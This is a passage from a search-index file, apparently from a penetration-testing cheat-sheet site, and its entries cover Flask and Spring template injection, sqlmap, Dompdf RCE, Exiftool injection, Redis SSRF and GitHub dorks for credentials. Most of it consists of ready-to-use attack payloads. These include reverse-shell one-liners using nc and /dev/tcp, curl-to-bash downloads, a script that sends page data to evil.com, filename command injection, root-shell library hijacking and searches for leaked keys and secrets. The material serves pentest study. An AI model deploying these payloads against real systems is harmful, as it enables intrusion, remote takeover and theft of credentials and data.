None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) "
            }
        );
    index.add(
            {
                id:  108 ,
                href: "\/docs\/hdks\/reconnaissance\/github-dorks\/",
                title: "GitHub Dorks",
                description: "Common Credentials link path:.env path:.env passwd path:.env password path:.env secret path:*.env api path:*.env passwd path:*.env password path:*.env secret path:config.* auth path:config.* password path:config.* passwd path:config.* token path:config.json password \"example.com\" password \"example.com\" passwd \"example.com\" credential \"example.com\" creds Web Conf link path:.htpasswd WordPress link path:wp-config.php Databases link path:.pgpass path:my.cnf path:redis.conf path:mongod.conf Git link path:.git-credentials Bash link path:.bash_history path:.bash_profile path:.bashrc path:.profile path:.bashrc password path:.bash_history root path:etc/passwd path:etc/shadow path:password.* SSH link path:id_rsa path:private_key path:.ssh/id_rsa Docker link path:docker.",
                content: "Common Credentials link path:.env path:.env passwd path:.env password path:.env secret path:*.env api path:*.env passwd path:*.env password path:*.env secret path:config.* auth path:config.* password path:config.* passwd path:config.* token path:config.json password \"example.com\" password \"example.com\" passwd \"example.com\" credential \"example.com\" creds Web Conf link path:.htpasswd WordPress link path:wp-config.php Databases link path:.pgpass path:my.cnf path:redis.conf path:mongod.conf Git link path:.git-credentials Bash link path:.bash_history path:.bash_profile path:.bashrc path:.profile path:.bashrc password path:.bash_history root path:etc/passwd path:etc/shadow path:password.* SSH link path:id_rsa path:private_key path:.ssh/id_rsa Docker link path:docker.conf path:docker.service Backup Files link path:*.bak path:backup path:backups "
            }
        );
    index.add(
            {
                id:  109 ,
                href: "\/docs\/hdks\/web\/framework\/python\/flask-jinja2-pentesting\/",
                title: "Flask Jinja2 Pentesting",
                description: "Flask is a micro web framework written in Python.",
                content: "Common Directories link /app.py /main.py /modules.py /modules/__init__.py /modules/admin.py SSTI (Server-Side Template Injection) linkSometimes, website may filter specific characters.\nIf so, URL encode the payload or convert to HEX.\nIn addition, its recommended to send requests using Burp Suite because web browsers automatically update the payload.\nFirst, try below payloads.\n{{ 4*2 }} {{ config.items() }} # Remove curly brackets {2*3} 2*3 RCE linkIf success, we may be able to exploit with OS command injection.\n{{ __import__('os').system('ping -c 1 10.0.0.1') }} {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }} {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }} {{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('id')['read']() }} {{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }} {{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')() }} {{ [].__class__.__base__.__subclasses__()[422]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }} {{ ''.__class__.__mro__[1].__subclasses__()[401](\"whoami\", shell=True, stdout=-1).communicate() }} Reverse Shell link {{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.0.0.1 443 0/tmp/ZTQ0Y 2\u003e\u00261; rm /tmp/ZTQ0Y').read()}} {{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.0.0.1 4444 \u003e/tmp/f')|attr('read')() }} # Filter bypass - Base64 encode {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEi\" | base64 -d | bash').read() }} Alternatively, we can create a shell script to reverse shell, then execute it in the server side.\nFor example, create a shell script named revshell in local machine.\n#!/bin/bash bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\" Then host it and start a listener for receiving an incoming request.\n# Local terminal 1 python3 -m http.server 8000 # Local terminal 2 nc -lvnp 4444 Now inject SSTI in the target website.\n{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.0.0.1:8000/revshell | bash').read()}} # Filter bypassing {{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fbuiltins\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fimport\\x5f\\x5f\")(\"os\")|attr(\"popen\")(\"curl 10.0.0.1:8000/revshell | bash\")|attr(\"read\")()}} We may get a shell.\nSSTI with Error Page linkIf the website displays an error page (404, 403, etc.) when we access to the page which does not exists, the path may be reflected in the error page. For example, when we attempt to access to /example.html which does not exist, the error page will show messages like the following.\nNo result for /example.html As you know, we can insert the malicious program using SSTI.\nFor instance, try to access http://example.com/{{ 2*3 }}.\nThe error page will reflect the result of 2*3 as follow.\nNo result for 6 Decode Session Cookie linkThe session of cookie in the Flask webapp can be decoded.\nFlask Session Cookie Decoder Cookie Forgery link1. Create a Python Virtual Environment link python3 -m venv myenv source myenv/bin/activate 2. Install Packages link pip3 install flask requests waitress 3. Create a Python Script linkFor instance, create test.py.\nReplace the SECRET_KEY value with the target Flask apps secret key.\n#!/usr/bin/env python3 from flask import Flask, session, request from waitress import serve import requests, threading, time app = Flask(__name__) app.config[\"SECRET_KEY\"] = \"c53ac69e07ed112ecb788eb4dc831990\" @app.route(\"/\") def main(): session[\"auth\"] = \"True\" session[\"username\"] = \"test\" # SSTI may be applied with \"{{ 3*7 }}\" return \"Check you cookies\", 200 # Flask setup/start thread = threading.Thread(target = lambda: serve(app, port=9000, host=\"127.0.0.1\")) thread.setDaemon(True) thread.start() # Request time.sleep(1) print(requests.get(\"http://localhost:9000/\").cookies.get(\"session\")) 4. Run the Script link python3 test.py The cookie value generated.\nCopy and paste it into the Cookie of the HTTP header in browser as below.\nCookie: session= Now we can login and access to admin page e.g. /admin.\nAfter exploiting, deactivate the python virtual environment.\ndeactivate "
            }
        );
    index.add(
            {
                id:  110 ,
                href: "\/docs\/hdks\/windows\/active-directory\/ldap-injection\/",
                title: "LDAP Injection",
                description: "LDAP may be vulnerable to query injection if website does not properly validate user input.",
                content: "Basic Payloads link (\u0026uid=*)(userPassword=*) (\u0026uid=*)|(userPassword=*) (\u0026uid=*)|(objectClass=*)(userPassword=password123) *)(uid=*))(|(password=*) "
            }
        );
    index.add(
            {
                id:  111 ,
                href: "\/docs\/hdks\/web\/security-risk\/sql-injection-with-sqlmap\/",
                title: "SQL Injection with Sqlmap",
                description: "SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution. This page provides how to inject SQL using sqlmap.",
                content: "Basic Usage link # GET request sqlmap -u \"http:///?search=test\" Using Burp Suite Request File linkWe can specify a request file which is downloaded from Burp Suite.\nIn Burp Suite, right-click on the HTTP request header screen, then click Save Item to download the request file. We can use it with SQLmap. Add the \"-r\" flag as below.\nsqlmap -r request.txt In addition, we can see payloads to be tested in Burp Suite by setting the Burp proxy IP address to the --proxy flag.\n# --proxy: Set proxy URL e.g. we can inspect requests in BurpSuite by port 8080 (default port for BurpSuite) sqlmap -u \"https://example.com/?q=test\" --proxy http://127.0.0.1:8080 Cheat Sheet linkBasic link sqlmap -u \"https://example.com/?q=test\" # Specific parameter sqlmap -u \"https://example.com/?q=test\" -p q # Header param injection sqlmap -u \"https://example.com/\" --headers \"X-Forwarded-For: 1*\" # POST body sqlmap -u \"https://example.com/\" --data=\"username=test\u0026password=test\" # Automate sqlmap -u https://example.com --crawl 2 # Batch mode sqlmap -u https://example.com --crawl 2 --batch Specify DBMS (Database Management System) linkWe can specify DBMS such as mysql, postgres, sqlite to avoid unnecessary attempts.\nsqlmap -u \"https://example.com/?q=test\" --dbms mysql sqlmap -u \"https://example.com/?q=test\" --dbms postgres sqlmap -u \"https://example.com/?q=test\" --dbms sqlite Enumerations link # List databases # --dbs: List databases sqlmap -u \"https://example.com/?q=test\" --dbs # List tables # -D: Specific name of the database # --table: List tables sqlmap -u \"https://example.com/?q=test\" -D exampledb --tables # List columns # -T: Specific name of the table # --columns: List columns sqlmap -u \"https://example.com/?q=test\" -D exampledb -T users --columns # Get each column value # -C: Specific name of the column. We can specify single column or multiple columns sqlmap -u \"https://example.com/?q=test\" -D exampledb -T users -C username sqlmap -u \"https://example.com/?q=test\" -D exampledb -T users -C username,password # Get current user and database sqlmap -u \"https://example.com/?q=test\" --current-user sqlamp -u \"https://example.com/?q=test\" --current-db Dump Entories linkWe can dump entories by adding --dump flag.\nsqlmap -u \"https://example.com/?q=test\" --dump # Specify dbms, database, table sqlmap -u \"https://example.com/?q=test\" --dump --dbms mysql -D exampledb -T users # Dump all entories sqlmap -u \"https://example.com/?q=test\" --dump-all Risk/Level linkWe can specify the injection risk and level.\nrisk\nRisk of tests to perform. Default is 1. Max is 3.\nlevel\nLevel of tests to perform. Default is 1. Max is 5.\nsqlmap -u \"https://example.com/?q=test\" --dump --dbms mysql --risk 3 --level 5 Random Agent link sqlmap -u \"https://example.com/?q=test\" --random-agent Fresh Queries linkIf the database is modified, we can refresh the states by adding --fresh-queries.\n# --fresh-queries: new data in tables sqlmap -u \"https://example.com/?q=test\" --fresh-queries Injection Techniques linkWe can specify the injection technique to test by adding --technique.\n# Union attack (U) sqlmap -u \"https://example.com/?q=test\" --technique U # --delay 2: Time delay sqlmap -u \"https://example.com/?q=test\" --technique U --delay 2 # Time-based Blind SQLi (T) sqlmap -u \"https://example.com/?q=test\" --technique T # Boolean-based blind injection (B) sqlmap -u \"https://example.com/?q=test\" --technique B Sleep linkWe can sleep for each injection.\n# --time-sec 2: Sleep 2 seconds. sqlmap -u \"https://example.com/?q=test\" --time-sec 2 Ignore HTTP response code linkWe can ignore specific HTTP response (status) code.\n# Ignore 401 (Unauthorized) sqlmap -u \"https://example.com/?q=test\" --ignore-code 401 # Ignore 500 (Internal Server Error) sqlmap -u \"https://example.com/?q=test\" --ignore-code 500 Drop Set-Cookie linkWe can drop Set-Cookie from HTTP response headers.\nsqlmap -u \"https://example.com/?q=test\" --drop-set-cookie Second Order Attack linkReference: https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap\nIf the SQL injection affects another URL, we want to customize the second URL.\nMethod 1. Simply adding the second request linkWe can add second-url or second-req flag in sqlmap command.\nNote that each request file (e.g. req1.txt, req2.txt) is downloaded by clicking save item in each request in BurpSuite.\n# -p: Specify the parameter where payload will be put sqlmap -u \"https://example.com/profile/change\" -p email --second-url \"https://example.com/dashboard\" sqlmap -r req1.txt -p email --second-req req2.txt Method 2. Tampering linkIf we could not achieve with the method 1, its worth to create a tamper function.\nFor example, create tamper.py with the content below.\n#!/usr/bin/env python import re import requests from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies(): pass def change_profile(payload): proxies = {'http':'http://127.0.0.1:8080'} cookies = {\"ExampleToken\": \"abcdef...xyz\"} params = {\"username\":\"tester\", \"email\":payload} url = \"https://example.com/profile/change\" req = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies) # If we need to send json param, use `json` attribute instead of `data`. url = \"https://example.com/dashboard\" req = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies) def tamper(payload, **kwargs): headers = kwargs.get(\"headers\", {}) change_profile(payload) return payload By setting the proxy to http://127.0.0.1:8080, we can see the requests and the responses in BurpSuite.\nAfter creating, run sqlmap as below.\n# Create this file in current directory to avoid error when running sqlmap with tamper touch __init__.py sqlmap --tamper tamper.py -r req1.txt -p email --second-req req2.txt --proxy http://127.0.0.1:8080 Web Shell linkAdd option os-shell to interact with web shell.\nsqlmap -u \"http://\" --cookie=\"value=*\" --os-shell After activating, you may want to upgrade to the full functional shell.\nYou can do that using reverse shell.\nIn your local machine,\nnc -lvnp 4444 Then execute the following command in web shell.\nos-shell\u003e bash -c 'bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261' Read Files link # --batch: never ask for user input, use the default behavior sqlmap -r request.txt --file-read \"/var/www/html/index.php\" --time-sec 10 --batch sqlmap -r request.txt --file-read \"/var/www//index.php\" --time-sec 10 --batch sqlmap -u \"http:///?q=test\" --file-read \"var/www/html/index.php\" --time-sec 10 --batch Tampering linkThe sqlmap can be tampered by custom python script e.g. tamper.py or the default library.\nTo list all tampers, run the following command.\nsqlmap --list-tampers WAF (Web Application Firewall) Bypass linkThis post explains details for what each module works.\n# General sqlmap -r request.txt --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,escapequotes,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes # MSSQL sqlmap -r request.txt --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes # MySQL sqlamp -r request.txt --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor Custom tamper modules (Base64 encode) linkWe can also create our custom modules.\nFor instance, we create tamper.py.\n#!/usr/bin/python3 from lib.core.convert import encodeBase64 from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies(): pass def tamper(payload, **kwargs): payload = encodeBase64(\"%s\" % payload, binary=False) return payload Then execute sqlmap.\n# The tamper is a module, so we need to create __init__.py in the current directory. touch __init__.py sqlmap -u \"https://example.com/\" --cookie \"session=*\" --tamper=tamper.py Multiple Requests link #!/usr/bin/python importrequests fromlib.core.enumsimportPRIORITY __priority__=PRIORITY.NORMAL address=\"http://vulnerable.com\" password=\"test\" defdependencies(): pass defcreate_account(payload): withrequests.Session()ass: data={\"username\":payload,\"password\":password} resp=s.post(f\"{address}/signup\",data=data) deflogin(payload): withrequests.Session()ass: data={\"username\":payload,\"password\":password} resp=s.post(f\"{address}/login\",data=data) sessid=s.cookies.get(\"session\",None) return\"session={}\".format(sessid) deftamper(payload,**kwargs): headers=kwargs.get(\"headers\",{}) create_account(payload) headers[\"Cookie\"]=login(payload) returnpayload Then run the sqlmap with the tamper option.\nsqlmap --tamper tamper.py --url http://vulnerable.com/signup --data \"username=admin\u0026password=test\" --second-url \"http://vulnerable.com/post\" --no-cast "
            }
        );
    index.add(
            {
                id:  112 ,
                href: "\/docs\/hdks\/web\/framework\/java\/spring-pentesting\/",
                title: "Spring Pentesting",
                description: "Spring is an application framework and inversion of control container for the Java platform.",
                content: "Framework Detection linkIf we get the Whitelabel Error Page, the website may use Spring Boot.\nEnumeration linkDirectory Discovery link ffuf -u https://example.com/FUZZ -w seclists/Discovery/Web-Content/spring-boot.txt SSTI linkDiscovery linkIf there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.\nTry them:\n2*2 #{2*2} *{2*2} Then you can also check more about that.\n{\"dfd\".replace(\"d\", \"x\")} #{\"dfd\".replace(\"d\", \"x\")} *{\"dfd\".replace(\"d\", \"x\")} // --------------------------------------- // the desired output of the above... \"xfx\" Reverse Shell linkFirst generate the payload of the reverse shell which will be downloaded from the website.\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf \u003e r.elf Start a local web server to allow the website to download the payload named r.elf\npython3 -m http.server 8000 In another terminal, open listener for getting the reverse shell.\nnc -lvnp In the target website,\n*{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"wget http://:8000/r.elf\")} *{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"chmod 777 ./r.elf\")} *{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"./r.elf\")} Finally we should see to get the shell.\nSpring4Shell (CVE-2022-22965) linkSpring4Shell is a vulnerabilitiy to remote code execution in Spring framework. It affects a component in Spring Core which is the heart of the framework.\nIt is identified as a bypass of the patch for CVE-2010-1622.\nExploitation linkWe can use Metasploit for this exploitation.\nmsfconsole msf\u003e use exploit/multi/http/spring_framework_rce_spring4shell Alternatively, various PoCs are available in GitHub repositories.\nhttps://github.com/BobTheShoplifter/Spring4Shell-POC https://github.com/Leovalcante/spring4shell https://github.com/me2nuk/CVE-2022-22965 "
            }
        );
    index.add(
            {
                id:  113 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/shared-library-hijacking\/",
                title: "Shared Library Hijacking",
                description: "Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file. strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell. find / -type f -name \"foo.so\" 2\u003e/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.",
                content: "Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.\nstrings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.\nfind / -type f -name \"foo.so\" 2\u003e/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.so Exploitation linkCreate foo.c.\n#include #include void foo() { setuid(0); setgid(0); system(\"/bin/bash -i\"); } Then compile it to shared object.\ngcc -shared -fPIC -nostartfiles -o foo.so foo.c Put the shared file to /path/to/foo.so .\nNow run the binary.\n./example # or sudo ./example We should get a root shell.\n"
            }
        );
    index.add(
            {
                id:  114 ,
                href: "\/docs\/hdks\/linux\/archive\/zip-unzip\/",
                title: "Zip \u0026 Unzip",
                description: "Zip is a command-line tool used for creating and manipulating compressed archive files in Unix, Linux, and other Unix-like operating systems.",
                content: "Compress link zip ... zip example.zip example1.txt example2.txt # -r: recursive (zip folder) zip -r example.zip ./example Symbolic Links linkWe can store symbolic links in a zip file.\nln -s /etc/passwd test.txt zip --symlink test.zip test.txt Decompress link unzip example.zip # Specify the directory to decompress unzip example.zip -d ./example List Files without Decompressings linkTo list files in a zip file without extracting, use -l flag.\nunzip -l example.zip Unzip with Python linkAlso we can decompress an archived file using Python script.\nimport zipfile filename = \"./sample.zip\" extdir = \"./\" password = \"password123\" with zipfile.ZipFile(filename, 'r') as zp: try: zp.extractall(path=extdir, pwd=password.encode('utf-8')) except RuntimeError as e: print(e) "
            }
        );
    index.add(
            {
                id:  115 ,
                href: "\/docs\/hdks\/web\/security-risk\/business-logic-attack\/",
                title: "Business Logic Attack",
                description: "Business Logic is the part of the program that encodes the real-world business rules that determine how data can be created, stored, and changed.",
                content: "Change Request Params to Unexpected Values link productId=-1 productId=a productId= # empty value productId=1\u0026price=-1000 Exploit Broken Two-Factor linkBrute force a MFA Code link POST /login HTTP/1.1 Cookie: verify=victim ... mfa-code=1111 Loop Back with 2,147,483,647 linkNo contents yet.\nRegister with Too Long-Length Email Address link POST /register HTTP/1.1 ... username=attacker\u0026password=pass1\u0026email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com Remove the Specific POST Params link POST /change-password HTTP/1.1 ... username=admin\u0026new-password-1=newpass\u0026new-password-2=newpass "
            }
        );
    index.add(
            {
                id:  116 ,
                href: "\/docs\/hdks\/web\/dompdf-rce\/",
                title: "Dompdf RCE",
                description: "Dompdf is an HTML to PDF converter for PHP. It may be vulnerable to remote code execution or SSRF.",
                content: "Exploitation link1. Create Malicious Font linkFirst off, we need to prepare the malicious .ttf file.\nHere, we find the .ttf file in our local system and copy it to the current directory and change the extention ttf to php because we want to execute PHP script.\nfind / -name \"*.ttf\" 2\u003e/dev/null cp /path/to/example.ttf ./evil.php Then add the PHP payload at the end of the file.\n... \u003c?php system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261'\"); ?\u003e 2. Create Malicious CSS linkNext we create a malicious CSS that load the above evil.php.\n@font-face { font-family: 'evil'; src: url('http://10.0.0.1:8000/evil.php'); font-weight: 'normal'; font-style: 'normal'; } 3. Host PHP \u0026 CSS linkNow we have the two files in current working directory.\nls evil.css evil.php Start web server to host them.\npython3 -m http.server 8000 4. Send Request linkIn target website, send request to upload the HTML as below.\nhttps://example.com/?pdf\u0026title= Our evil.php is uploaded to /dompdf/lib/fonts/__.php.\nFor example, /dompdf/lib/fonts/evil_normal_2cddaeb743b6aeb5638ac0ac93c4c9f6.php.\nTo get the md5 hash, we can calculate it by the following command.\necho -n http://10.0.0.1:8000/evil.php | md5sum 2cddaeb743b6aeb5638ac0ac93c4c9f6 Also we can use Python hashlib module.\npython3 \u003e\u003e\u003e import hashlib \u003e\u003e\u003e hashlib.md5(\"http://10.0.0.1:8000/evil.php\".encode(\"UTF-8\")).hexdigest() \u003e\u003e\u003e 2cddaeb743b6aeb5638ac0ac93c4c9f6 5. Execute Malicious PHP via Cached File linkFinally we get the cached file path as above so we can get the cached PHP file that executes malicious code.\nFor reverse shell, we need to start a listener in local.\nnc -lvnp 4444 Now access to the cached PHP file.\ncurl https://example.com/dompdf/lib/fonts/evil_normal_2cddaeb743b6aeb5638ac0ac93c4c9f6.php We get a shell in local terminal.\nExploitation (Automatically) linkAlso we can exploit with the repository.\ngit clone https://github.com/positive-security/dompdf-rce.git cd dompdf-rce/exploit Modify CSS and PHP depending on your situation. Please see the previous Exploitation section for the details of each file.\nphp -S 0.0.0.0:9001 Then send request.\nhttps://example.com/?pdf\u0026title= "
            }
        );
    index.add(
            {
                id:  117 ,
                href: "\/docs\/hdks\/windows\/service\/m365-pentesting\/",
                title: "M365 (Microsoft Office 365) Pentesting",
                description: "Enumeration linkPassword Spraying linkWe may spray user passwords with open-source tools as below.\nMFASweap o365spray ",
                content: "Enumeration linkPassword Spraying linkWe may spray user passwords with open-source tools as below.\nMFASweap o365spray "
            }
        );
    index.add(
            {
                id:  118 ,
                href: "\/docs\/hdks\/web\/security-risk\/redis-ssrf\/",
                title: "Redis SSRF",
                description: "Investigation linkIf the target server runs Redis server and the website interacts with the Redis server, we can modify the key value in the Redis and reflects the result through SSRF using gopher.\nurl=http://evil.com/ Exploitation linkAutomation linkWe can use Gopherus to create a payload.\nPayload Manually linkTo make the payload for SSRF manually, we need to know what commands to insert.\nTo make it clear, try to demonstrate the command (RESP format) to update the target key value in Redis.",
                content: "Investigation linkIf the target server runs Redis server and the website interacts with the Redis server, we can modify the key value in the Redis and reflects the result through SSRF using gopher.\nurl=http://evil.com/ Exploitation linkAutomation linkWe can use Gopherus to create a payload.\nPayload Manually linkTo make the payload for SSRF manually, we need to know what commands to insert.\nTo make it clear, try to demonstrate the command (RESP format) to update the target key value in Redis. Please see the Redis commands for details.\nBelow is the example command same as SET user ....\ntelnet 10.0.0.1 6379 *3 # 3 arguments (\"SET\", \"user\", \"\") $3 # 3 length of the string \"SET\" SET $4 # 4 length of the string \"user\" key user $18 # 18 length of the string \"\" ping+-c+1+10.0.0.2 Then we need to format the above command for the gopher URL. Its need to be URL encoded conained %0D%0A (\\r\\n).\ngopher://10.0.0.1:6379/_%0D %0D%0A # \\r\\n %2A3 # *3 %0D%0A # \\r\\n %243 # $3 %0D%0A # \\r\\n SET %0D%0A # \\r\\n %244 # $4 %0D%0A # \\r\\n user %0D%0A # \\r\\n %2418 # $18 %0D%0A ping%2B%2Dc%2B1%2B10%2E0%2E0%2E2 # ping+-c+1+10.0.0.2 %0D%0A Finally we get the payload.\ngopher://10.0.0.1:6379/_%250D%0A%250D%250A%0A%252A3%0A%250D%250A%0A%25243%0A%250D%250A%0ASET%0A%250D%250A%0A%25244%0A%250D%250A%0Auser%0A%250D%250A%0A%252418%0A%250D%250A%0Aping+-c+1+10.0.0.2%0A%250D%250A Copy it and paste to where the payload affects the result.\n"
            }
        );
    index.add(
            {
                id:  119 ,
                href: "\/docs\/hdks\/windows\/forensics\/windows-memory-dump-analysis\/",
                title: "Windows Memory Dump Analysis",
                description: "A memory dump file (.dmp), also called as 'crash dump' is a crash report file.",
                content: "Investigation link file example.dmp # Output example.dmp: Mini DuMP crash report, 18 streams, Sat Nov ... Static Analysis linkWe can also read contents of this file by usual static analysis such as below.\nstrings example.dmp strings example.dmp | grep -i password # Open pager strings example.dmp | less xxd example.dmp Using Debugger link IDA, ILSpy Visual Studio Using Online Viewer linkThis file can also be read with online DMP viewer.\nDump KeePass Master Key (CVE-2023-32784) linkIf the .dmp file contains KeePass memory, we might be able to dump the master key. This vulnerability exists in KeePass 2.x before 2.54. keepass-password-dumpter is useful to do that.\nIn Windows, run the follwoing command.\ngit clone https://github.com/vdohney/keepass-password-dumper.git cd keepass-password-dumper dotnet run example.dmp "
            }
        );
    index.add(
            {
                id:  120 ,
                href: "\/docs\/hdks\/web\/broken-link-hijacking\/",
                title: "Broken Link Hijacking",
                description: "Broken Link Hijacking is an attack method that attacker can execute arbitrary code by hijacking link e.g. JavaScript file if target website is loading file with broken link.",
                content: "Investigation linkAssume that target website loads external JavaScript file in example.com no longer exists as below.\nIf attacker bought this domain, he can host arbitrary JavaScript file named script.js in the example.com root directory.\nExploitation Examples linkAttacker can write arbitrary code for compromising users in script.js as example above.\nFor example, if target website includes sensitive information of authenticated user in the page where the broken link is loaded, attackers can send these information to their owned server.\n// script.js var secret = document.getElementById('userinfo'); var request = new XMLHttpRequest(); request.open('GET', 'http://evil.com/?data=' + secret, false); request.send(); "
            }
        );
    index.add(
            {
                id:  121 ,
                href: "\/docs\/hdks\/web\/security-risk\/file-upload-attack-on-exiftool\/",
                title: "File Upload Attack on Exiftool",
                description: "If website uses Exiftool to analyze uploaded files, we might be able to exploit the vulnerabilities.",
                content: "Polyglot Attack linkWe might be able to execute remote code by polyglotting the original plain image file.\nAt first, create a blank image file as below, but this step may be not required if you already have some image file.\nconvert -size 32x32 xc:white test.jpg Then insert OS command with exiftool.\nexiftool -Comment=\"\u003c?php system('ls'); ?\u003e\" example.png exiftool -Comment='\u003c?php echo \"\"; system($_GET['cmd']); ?\u003e' exploit.png exiftool -Comment=\"\u003c?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?\u003e\" example.jpg -o polyglot.php Command Injection (version \u003c v12.38) linkOn Exiftool version lower than 12.38, we can inject OS command in the filename when uploading.\n# Ping filename=\"touch test; ping -c 1 10.0.0.1 |\" # Reverse shell filename=\"touch test; bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261 |\" filename=\"touch test; bash -c \\\"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\\\" |\" filename=\"touch test; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\\\"10.0.0.1\\\", 1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"bash\\\")' |\" "
            }
        );
    index.add(
            {
                id:  122 ,
                href: "\/docs\/hdks\/web\/security-risk\/file-upload-attack-on-imagemagick\/",
                title: "File Upload Attack on ImageMagick",
                description: "If website uses ImageMagick to analyze or modify uploaded images, we might be able to execute remote code.",
                content: "This page is no content yet, but please refer to the references below to achieve this attack.\n"
            }
        );
    index.add(
            {
                id:  123 ,
                href: "\/docs\/hdks\/reconnaissance\/find-leaked-api-keys\/",
                title: "Find Leaked API Keys",
                description: "Finding API keys which are leaked is crucial work for penetration testing or bug bounty. If we found the API keys leaked, sensitive information is at risk of being stolen. So immediate actions must be taken.",
                content: "Awesome Resources link Keyhacks\nThis repository lists quick ways to find API keys of various providers.\nGoogle Dorks linkGoogle Dorks is useful to search leaked API keys/tokens.\n*Here is the simple example so might be unuseful. Please see Awesome Resources section if you are seriously looking for that.\nCommon APIs linkTry changing the site domain and the extensions e.g. js, py, go.\n# GitHub repositories site:github.com ext:php \"api-key\" site:github.com ext:php \"api_key\" site:github.com ext:php \"api-token\" site:github.com ext:php \"api_token\" site:github.com ext:php \"access-token\" site:github.com ext:php \"access_token\" site:github.com ext:php \"x-api-key\" site:github.com ext:php \"x_api_key\" site:github.com ext:php \"x-api-token\" site:github.com ext:php \"x_api_token\" site:github.com ext:php \"x-access-token\" site:github.com ext:php \"x_access_token\" # GitLab repositories site:gitlab.com ext:php \"api-key\" AWS link site:github.com ext:py \"ap-northeast-1.amazonaws.com\" \"x-api-key\" Google APIs link site:github.com ext:py \"googleapis.com\" \"?key=\" Hugging Face link site:github.com ext:py \"https://api-inference.huggingface.co/models\" \"Authorization: Bearer\" OpenAI link site:github.com ext:py \"https://api.openai.com/v1/models\" \"Authorization: Bearer\" "
            }
        );
    index.add(
            {
                id:  124 ,
                href: "\/docs\/hdks\/web\/security-risk\/idor-attack\/",
                title: "IDOR (Insecure Direct Object References) Attack",
                description: "IDOR is a type of access control vulnerability in web applications.",
